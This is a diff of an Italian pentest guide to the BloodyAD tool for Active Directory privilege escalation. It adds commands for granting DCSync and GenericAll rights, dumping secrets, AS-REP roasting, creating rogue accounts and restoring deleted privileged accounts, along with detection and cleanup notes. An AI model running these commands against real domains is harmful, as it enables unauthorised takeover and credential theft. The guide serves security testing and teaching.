@@ -1,10 +1,7 @@
 ---
 title: 'BloodyAD: Privilege Escalation in Active Directory (Guida 2026)'
 slug: bloodyad
-description: >-
-  BloodyAD:autenticazione PTH/PTT, abuso ACE (GenericAll, WriteDACL, RBCD),
-  Shadow Credentials, Bad Successor 2025 e autobloody.Pentest,payload,detection
-  e bypass
+description: 'BloodyAD:autenticazione PTH/PTT, abuso ACE (GenericAll, WriteDACL, RBCD), Shadow Credentials, Bad Successor 2025 e autobloody.Pentest,payload,detection e bypass'
 image: /bloodyad-active-directory.webp
 draft: false
 date: 2026-07-04T00:00:00.000Z
@@ -237,9 +234,65 @@ bloodyAD --host DC -d corp -u user -p pass get writable
 #   permission: WriteProperty (pwdLastSet, description)
 # distinguishedName: CN=Helpdesk,CN=Groups,DC=corp,DC=local
 #   permission: WriteMember
+
+# Filtra per tipo di oggetto (OU, USER, COMPUTER, GROUP, DOMAIN, GPO)
+bloodyAD --host DC -d corp -u user -p pass get writable --otype COMPUTER
+
+# Filtra per tipo di diritto (ALL, WRITE, CHILD)
+bloodyAD --host DC -d corp -u user -p pass get writable --right WRITE
+
+# Mostra il dettaglio degli attributi/object type scrivibili per ogni oggetto
+bloodyAD --host DC -d corp -u user -p pass get writable --detail
+
+# Escludi gli oggetti cancellati (di default sono inclusi)
+bloodyAD --host DC -d corp -u user -p pass get writable --exclude-del
+
+# Esporta i risultati in uno zip compatibile con BloodHound
+bloodyAD --host DC -d corp -u user -p pass get writable --bh
 ```
 
 L'output di `get writable` corrisponde esattamente ai path che BloodHound mostrerebbe come "edge" a partire dall'utente corrente.
+
+### `get bloodhound` — collector BloodHound CE integrato
+
+BloodyAD include un collector BloodHound CE nativo — comodo quando non puoi far girare SharpHound (es. AV/EDR aggressivo) e ti basta LDAP puro. È ancora in sviluppo: copre le basi ma non ADCS ESC e altri nodi complessi.
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass get bloodhound
+
+# Prova a raggiungere anche i trust per un dataset più completo
+# (lancialo da un DC del dominio dell'utente per risultati più esaustivi)
+bloodyAD --host DC -d corp -u user -p pass get bloodhound --transitive
+
+# Salva lo zip in un path specifico
+bloodyAD --host DC -d corp -u user -p pass get bloodhound --path /tmp/bh_data.zip
+```
+
+### `get trusts` — mappa dei trust di dominio/foresta
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass get trusts
+
+# A->B: A può autenticarsi su B
+# A-<B: B può autenticarsi su A
+# A-<>B: trust bidirezionale
+
+bloodyAD --host DC -d corp -u user -p pass get trusts --transitive
+```
+
+### `get dnsDump` — dump di tutti i record DNS leggibili
+
+Più comodo di interrogare oggetto per oggetto — enumera in un colpo solo tutti i record DNS della zona che l'utente può leggere.
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass get dnsDump
+
+# Solo una zona specifica
+bloodyAD --host DC -d corp -u user -p pass get dnsDump --zone corp.local
+
+# Nascondi i record di sistema (_ldap, _kerberos, @, ecc.)
+bloodyAD --host DC -d corp -u user -p pass get dnsDump --no-detail
+```
 
 ### `get children` — contenuto di un OU o container
 
@@ -454,6 +507,89 @@ bloodyAD --host DC -d corp -u user -p pass \
 # Verifica che il record sia stato aggiunto
 bloodyAD --host DC -d corp -u user -p pass \
   get object 'attacker.corp.local' --type dnsnode
+
+# Altri tipi di record (default A)
+bloodyAD --host DC -d corp -u user -p pass \
+  add dnsRecord webserver 10.10.14.1 --dnstype A --zone corp.local --ttl 300
+```
+
+### `add genericAll` — concedi controllo completo via ACE
+
+Se hai già `WriteDACL` (o sei owner) su un oggetto, `add genericAll` aggiunge direttamente una ACE che ti dà controllo pieno — alternativa nativa più diretta rispetto a passare da `msldap setsd`.
+
+```bash
+# Concedi a MYUSER controllo completo su TARGET (utente, gruppo, OU, computer...)
+bloodyAD --host DC -d corp -u user -p pass \
+  add genericAll TARGET MYUSER
+
+# Esempio: dopo aver preso ownership con set owner, ti auto-concedi GenericAll
+bloodyAD --host DC -d corp -u user -p pass \
+  set owner victim.user user
+bloodyAD --host DC -d corp -u user -p pass \
+  add genericAll victim.user user
+# ora hai GenericAll → set password, add shadowCredentials, ecc.
+```
+
+### `add dcsync` — concedi diritti di replica (DCSync)
+
+Se hai `WriteDACL` sull'oggetto dominio (o ne sei owner), `add dcsync` aggiunge le due extended right necessarie (`DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All`) al trustee indicato — senza bisogno di essere Domain Admin.
+
+```bash
+bloodyAD --host DC -d corp -u it_user -p pass \
+  add dcsync it_user
+
+# poi DCSync vero e proprio con impacket
+impacket-secretsdump corp.local/it_user:pass@DC_IP -just-dc
+```
+
+### `add uac` — imposta flag userAccountControl
+
+A differenza di `set object userAccountControl <valore>` (che sovrascrive l'intero bitmask e richiede calcolarlo a mano), `add uac` aggiunge solo il flag specifico senza toccare gli altri.
+
+```bash
+# Disabilita il requisito di pre-autenticazione Kerberos (AS-REP Roasting)
+bloodyAD --host DC -d corp -u user -p pass \
+  add uac TARGET -f DONT_REQ_PREAUTH
+
+# Abilita delega non vincolata su un computer (se hai i permessi)
+bloodyAD --host DC -d corp -u admin -p pass \
+  add uac 'SERVER01$' -f TRUSTED_FOR_DELEGATION
+
+# Abilita delega vincolata con protocol transition
+bloodyAD --host DC -d corp -u user -p pass \
+  add uac TARGET_USER -f TRUSTED_TO_AUTH_FOR_DELEGATION
+
+# Password che non scade mai (utile per non "rompere" un account durante un test)
+bloodyAD --host DC -d corp -u admin -p pass \
+  add uac TARGET -f DONT_EXPIRE_PASSWORD
+```
+
+> Flag combinabili con più `-f` nella stessa chiamata. Vedi anche `remove uac` più avanti per il cleanup.
+
+### `add computer` — crea un computer account (nativo)
+
+Alternativa integrata a `impacket-addcomputer`: sfrutta il `MachineAccountQuota` per creare un computer account controllato dall'attaccante, utile per RBCD.
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass \
+  add computer EVIL01 'Evil@Pass123'
+
+# Con OU specifica
+bloodyAD --host DC -d corp -u user -p pass \
+  add computer EVIL01 'Evil@Pass123' --ou 'OU=Workstations,DC=corp,DC=local'
+```
+
+> Se ottieni l'errore `problem 1005 (CONSTRAINT_ATT_TYPE)`, assicurati di passare il dominio come FQDN completo in `-d` (es. `-d corp.local`, non solo `corp`).
+
+### `add user` — crea un nuovo utente (nativo)
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass \
+  add user evil.user 'Password123!'
+
+# Con OU specifica
+bloodyAD --host DC -d corp -u user -p pass \
+  add user evil.user 'Password123!' --ou 'OU=Users,DC=corp,DC=local'
 ```
 
 ### `add badSuccessor` — Windows Server 2025
@@ -501,11 +637,124 @@ bloodyAD --host DC -d corp -u admin -p pass \
 bloodyAD --host DC -d corp -u user -p pass \
   remove rbcd 'DC01$' 'ATTACK01$'
 
+# Revoca i diritti DCSync concessi con 'add dcsync'
+bloodyAD --host DC -d corp -u it_user -p pass \
+  remove dcsync it_user
+
+# Rimuovi un record DNS aggiunto in precedenza (cleanup PoC)
+bloodyAD --host DC -d corp -u user -p pass \
+  remove dnsRecord webserver 10.10.14.1
+
 # Rimuovi Shadow Credentials aggiunte
 bloodyAD --host DC -d corp -u attacker -p pass \
-  remove shadowCredentials john.doe --key-id KEY_ID
+  remove shadowCredentials john.doe --key KEY_ID
 # KEY_ID è visibile nell'output di 'add shadowCredentials' o 'get object --attr msDS-KeyCredentialLink'
+# senza --key rimuove TUTTE le Key Credentials del target
+
+# Rimuovi la ACE GenericAll aggiunta con 'add genericAll'
+bloodyAD --host DC -d corp -u user -p pass \
+  remove genericAll TARGET MYUSER
+
+# Rimuovi un flag userAccountControl (es. riabilita pre-auth Kerberos disabilitata prima)
+bloodyAD --host DC -d corp -u user -p pass \
+  remove uac TARGET -f DONT_REQ_PREAUTH
+
+# Elimina completamente un oggetto AD (utente, gruppo, computer, OU...)
+# ATTENZIONE: a differenza degli altri 'remove', questo cancella l'oggetto intero
+bloodyAD --host DC -d corp -u admin -p pass \
+  remove object 'CN=evil.user,CN=Users,DC=corp,DC=local'
 ```
+
+> `remove object` sposta l'oggetto nel container "Deleted Objects" (tombstone/recycle bin) — non lo distrugge subito. Per il periodo di tombstone lifetime (default 180 giorni) è ancora recuperabile con `set restore` — vedi la sezione dedicata più avanti.
+
+***
+
+## Oggetti cancellati — enumerazione e restore (AD Recycle Bin / Tombstone)
+
+Quando un oggetto AD viene cancellato (utente, gruppo, computer, GPO...), non sparisce subito. Se l'AD Recycle Bin è attivo, l'oggetto diventa **recycled** e resta recuperabile con tutti gli attributi per la durata del `tombstone lifetime` (default 180 giorni). Se il Recycle Bin non è abilitato o il DC è più vecchio di 2008 R2, l'oggetto viene solo **tombstoned**: perde la maggior parte degli attributi (incluse le membership di gruppo) ma conserva `objectSid`, `nTSecurityDescriptor` (quindi le ACL dirette restano intatte) e, da Windows 2003 in poi, il `sIDHistory`.
+
+Questo è un vettore di attacco spesso trascurato: se un attaccante ha diritti di scrittura su un oggetto cancellato o su una OU dove ripristinarlo, può far tornare in vita account privilegiati, o oggetti ancora referenziati in ACL su risorse critiche.
+
+### Trovare oggetti cancellati su cui hai permessi
+
+```bash
+# get writable con oggetti cancellati inclusi
+bloodyAD --host DC -d corp -u user -p pass -k get writable --include-del
+
+# Output tipico:
+# distinguishedName: CN=garbage.admin\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=corp,DC=local
+#   permission: WRITE
+# distinguishedName: CN=Users,DC=corp,DC=local
+#   permission: CREATE_CHILD   ← serve anche questo per ripristinare l'oggetto nella OU
+```
+
+Nota: `get writable` di default include già i deleted objects; usa `--exclude-del` se vuoi escluderli dai risultati.
+
+### Ricerca avanzata con i controlli LDAP per oggetti tombstoned
+
+```bash
+# Ricerca con i controlli estesi che mostrano oggetti tombstoned/recycled
+bloodyAD --host DC -d corp -u user -p pass -k get search \
+  -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 \
+  --filter '(isDeleted=TRUE)' --attr sAMAccountName,objectSid,lastKnownParent
+```
+
+### `set restore` — ripristina un oggetto cancellato
+
+```bash
+# Ripristino base — usa sAMAccountName, DN, o SID (SID è più affidabile se ci sono duplicati)
+bloodyAD --host DC -d corp -u user -p pass -k set restore todd.wolfe
+# [+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Support,DC=corp,DC=local
+
+# Ripristino tramite SID (consigliato se sAMAccountName potrebbe essere duplicato)
+bloodyAD --host DC -d corp -u user -p pass \
+  set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'
+
+# Ripristino con nuovo nome (aggiorna anche sAMAccountName, UPN, SPN)
+bloodyAD --host DC -d corp -u user -p pass \
+  set restore todd.wolfe --newName 'todd.wolfe2'
+
+# Ripristino in una OU diversa da quella originale
+bloodyAD --host DC -d corp -u user -p pass \
+  set restore todd.wolfe --newParent 'OU=Users,DC=corp,DC=local'
+```
+
+**Requisiti:** serve il permesso `Restore Deleted Objects` (o essere owner/avere WRITE sull'oggetto tombstoned) più `CREATE_CHILD` sulla OU di destinazione.
+
+### Scenari di abuso reali
+
+```bash
+# Scenario A — Restore di un utente admin cancellato per errore/da un IT che non sa
+# che il gruppo Domain Admins referenzia ancora il suo SID in qualche ACL
+bloodyAD --host DC -d corp -u user -p pass get writable --include-del
+bloodyAD --host DC -d corp -u user -p pass set restore old.admin
+# old.admin torna vivo con le stesse membership/ACL di prima della cancellazione
+
+# Scenario B — SID History abuse: un utente cancellato aveva sidHistory
+# verso un gruppo privilegiato. Il ripristino riporta anche quello.
+bloodyAD --host DC -d corp -u user -p pass \
+  get object old.admin --attr sIDHistory --raw
+
+# Scenario C — Un gruppo cancellato è ancora referenziato nelle ACL di una risorsa
+# (share, GPO...). Ripristinandolo e aggiungendosi come membro, si eredita l'accesso.
+bloodyAD --host DC -d corp -u user -p pass set restore 'old-privileged-group'
+bloodyAD --host DC -d corp -u user -p pass add groupMember old-privileged-group user
+```
+
+> HTB TombWatcher è una macchina pensata apposta per esercitarsi su questo vettore (SID History injection + restore di oggetti tombstoned).
+
+### Detection sul restore
+
+```
+Event ID 5138 — A directory service object was undeleted
+  → l'evento chiave per il monitoring dei restore, con Recycle Bin attivo
+
+4662 su isDeleted=FALSE
+  → anche senza Recycle Bin dedicato, ogni operazione di scrittura
+    che riporta isDeleted a FALSE genera 4662 sull'oggetto target
+```
+
+Per il blue team: abilitare `Directory Service Changes` nell'Advanced Audit Policy (`AuditPol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable`) e allertare su ogni 5138 fuori da operazioni IT pianificate — specialmente se il `lastKnownParent` dell'oggetto ripristinato è una OU con account privilegiati.
 
 ***
 
@@ -623,6 +872,41 @@ git clone https://github.com/CravateRouge/Single-User-BloodHound.git
 cd Single-User-BloodHound
 ./bloodhound-ce    # avvia tutto con Docker Compose
 ```
+
+***
+
+## Il modulo `msldap` — funzioni sperimentali
+
+Oltre a `get`/`set`/`add`/`remove`, BloodyAD espone un quarto gruppo di comandi, `msldap`, che dà accesso diretto a funzioni più basso livello della libreria MSLDAP (quasi 90 sotto-comandi). È marcato **esplicitamente sperimentale** dal progetto — usalo solo se il comando equivalente in `get`/`set`/`add`/`remove` non copre il caso.
+
+```bash
+bloodyAD --host DC -d corp -u user -p pass msldap -h
+```
+
+Alcuni dei più utili per un pentest:
+
+```bash
+# Utenti ASREP-roastable (equivalente rapido a una get search filtrata)
+bloodyAD --host DC -d corp -u user -p pass msldap asrep
+
+# SPN kerberoastable
+bloodyAD --host DC -d corp -u user -p pass msldap spns
+
+# Delegazione non vincolata / vincolata già configurata nel dominio
+bloodyAD --host DC -d corp -u user -p pass msldap unconstrained
+bloodyAD --host DC -d corp -u user -p pass msldap constrained
+
+# Verifica rapida se Bad Successor è sfruttabile
+bloodyAD --host DC -d corp -u user -p pass msldap badsuccessor_check
+
+# Password LAPS leggibili
+bloodyAD --host DC -d corp -u user -p pass msldap laps
+
+# Whoami completo (permessi effettivi, gruppi, SID)
+bloodyAD --host DC -d corp -u user -p pass msldap whoami
+```
+
+> Il modulo `msldap` duplica in parte funzionalità già coperte da `get`/`add`/`remove` (es. `msldap adduser` vs `add user`) — preferisci sempre i comandi principali quando esiste un equivalente, sono più testati e stabili.
 
 ***
 
@@ -752,6 +1036,9 @@ $BASE get object TARGET                    # tutti gli attributi
 $BASE get writable                         # cosa puoi modificare
 $BASE get membership TARGET                # gruppi
 $BASE get children 'OU=Users,DC=corp,DC=local'  # contenuto OU
+$BASE get trusts                           # mappa trust dominio/foresta
+$BASE get dnsDump                          # tutti i record DNS leggibili
+$BASE get bloodhound                       # collector BloodHound CE nativo
 
 # === ForceChangePassword ===
 $BASE set password TARGET 'NewPass!'
@@ -787,29 +1074,41 @@ $BASE set owner TARGET MYUSER              # diventa owner → poi modifica ACL
 $BASE add badSuccessor EVIL_DMSA
 # usa ticket generato per secretsdump
 
+# === Oggetti cancellati ===
+$BASE get writable --include-del             # trova oggetti tombstoned scrivibili
+$BASE set restore TARGET                     # ripristina (sAMAccountName/DN/SID)
+$BASE set restore TARGET --newParent 'OU=Users,DC=corp,DC=local'
+
+# === UAC (flag account) ===
+$BASE add uac TARGET -f DONT_REQ_PREAUTH     # AS-REP roasting
+$BASE add uac TARGET -f TRUSTED_TO_AUTH_FOR_DELEGATION
+$BASE remove uac TARGET -f ACCOUNTDISABLE    # riabilita account disabilitato
+
 # === CLEANUP ===
 $BASE remove groupMember 'Domain Admins' MYUSER
 $BASE remove rbcd TARGET$ EVIL$
-$BASE remove shadowCredentials TARGET --key-id KEY_ID
+$BASE remove shadowCredentials TARGET --key KEY_ID
+$BASE remove genericAll TARGET MYUSER
 ```
 
 ***
 
 ## MITRE ATT\&CK
 
-| Tattica              | Tecnica       | Come BloodyAD la implementa                          |
-| -------------------- | ------------- | ---------------------------------------------------- |
-| Discovery            | **T1069.002** | Enumerazione gruppi e membership AD                  |
-| Discovery            | **T1087.002** | Enumerazione account AD (`get object`, `get search`) |
-| Credential Access    | **T1003.006** | DCSync via `add dcsync` + impacket-secretsdump       |
-| Credential Access    | **T1558.003** | SPN per Kerberoasting (`get search` + filter SPN)    |
-| Privilege Escalation | **T1484.001** | Modifica ACL dominio (`add dcsync`, WriteDACL)       |
-| Privilege Escalation | **T1098**     | Aggiunta account a gruppi privilegiati               |
-| Privilege Escalation | **T1134.001** | Shadow Credentials → PKINIT → token impersonation    |
-| Lateral Movement     | **T1550.003** | Pass-the-Hash, Pass-the-Ticket per auth              |
-| Lateral Movement     | **T1021.002** | SMB post-RBCD via getST                              |
-| Defense Evasion      | **T1207**     | RBCD su DC per DCSync senza DCSync diretto           |
-| Persistence          | **T1098.004** | Shadow Credentials persistenti                       |
+| Tattica              | Tecnica       | Come BloodyAD la implementa                                                               |
+| -------------------- | ------------- | ----------------------------------------------------------------------------------------- |
+| Discovery            | **T1069.002** | Enumerazione gruppi e membership AD                                                       |
+| Discovery            | **T1087.002** | Enumerazione account AD (`get object`, `get search`)                                      |
+| Credential Access    | **T1003.006** | DCSync via `add dcsync` + impacket-secretsdump                                            |
+| Credential Access    | **T1558.003** | SPN per Kerberoasting (`get search` + filter SPN)                                         |
+| Privilege Escalation | **T1484.001** | Modifica ACL dominio (`add dcsync`, WriteDACL)                                            |
+| Privilege Escalation | **T1098**     | Aggiunta account a gruppi privilegiati                                                    |
+| Privilege Escalation | **T1134.001** | Shadow Credentials → PKINIT → token impersonation                                         |
+| Lateral Movement     | **T1550.003** | Pass-the-Hash, Pass-the-Ticket per auth                                                   |
+| Lateral Movement     | **T1021.002** | SMB post-RBCD via getST                                                                   |
+| Defense Evasion      | **T1207**     | RBCD su DC per DCSync senza DCSync diretto                                                |
+| Persistence          | **T1098.004** | Shadow Credentials persistenti                                                            |
+| Persistence          | **T1098**     | Restore di oggetti cancellati (utenti/gruppi privilegiati, SID History) via `set restore` |
 
 ***
 
@@ -832,6 +1131,12 @@ Il MachineAccountQuota è un attributo del dominio che specifica quanti computer
 
 **Bad Successor funziona su tutti i domini Windows Server 2025?**
 Richiede che lo schema AD sia stato aggiornato alla versione 91+ (Windows Server 2025). Se l'organizzazione ha già aggiornato lo schema per supportare WS2025, l'attacco è possibile anche su DC che girano ancora WS2022, purché l'attaccante abbia il permesso di creare oggetti in almeno una OU.
+
+**Come ripristino un utente o un oggetto cancellato con BloodyAD?**
+Con `set restore TARGET`, dove TARGET può essere sAMAccountName, DN o SID (SID è più sicuro se il nome è duplicato). Serve il permesso "Restore Deleted Objects" o essere owner dell'oggetto tombstoned, più CREATE\_CHILD sulla OU di destinazione. Puoi anche rinominarlo o spostarlo con `--newName` e `--newParent`.
+
+**Qual è la differenza tra oggetto "recycled" e "tombstoned"?**
+Con l'AD Recycle Bin attivo, un oggetto cancellato diventa "recycled" e mantiene tutti gli attributi fino a fine tombstone lifetime (default 180 giorni). Senza Recycle Bin (o su DC pre-2008 R2), l'oggetto è solo "tombstoned": perde quasi tutti gli attributi e le membership di gruppo, ma conserva objectSid, nTSecurityDescriptor e sIDHistory — abbastanza per essere comunque abusabile.
 
 ***
 
